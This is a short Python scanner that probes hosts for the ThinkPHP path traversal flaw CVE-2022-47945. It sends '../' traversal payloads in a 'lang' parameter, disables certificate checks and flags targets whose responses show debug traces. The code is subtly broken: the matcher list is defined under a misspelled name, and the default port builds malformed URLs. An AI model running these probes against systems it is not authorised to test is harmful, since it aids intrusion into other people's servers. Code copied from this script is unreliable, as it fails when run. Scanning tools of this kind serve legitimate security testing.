import requests
from lib.headers.headers_handler import user_agents
from lib.color_handler import print_green, print_blue, print_red, print_yellow

def check_CVE_2022_47945(ip, ports=None, timeout=10):
    headers = {
    'User-Agent': user_agents()
    }
    macthers = ['Call Stack', 'class="trace']
    paths = [
    "/?lang=../../thinkphp/base",
    "/?lang=../../../../../vendor/topthink/think-trace/src/TraceDebug"
    ]

    protocols = ["http", "https"]
    if ports is None:
        ports = [80]
    else:
        ports = [f":{port}" for port in ports]

    for protocol in protocols:
        for port in ports:
            for path in paths:
                url = f"{protocol}://{ip}{port}{path}"
                try:
                    response = requests.get(url, headers=headers, verify=False, timeout=timeout)
                    if any(matcher in response.text for matcher in matchers):
                        print_green(f"The target is vulnerable to CVE-2022-47945 : {url}")
                        return True
                except requests.RequestException:
                    continue
    return False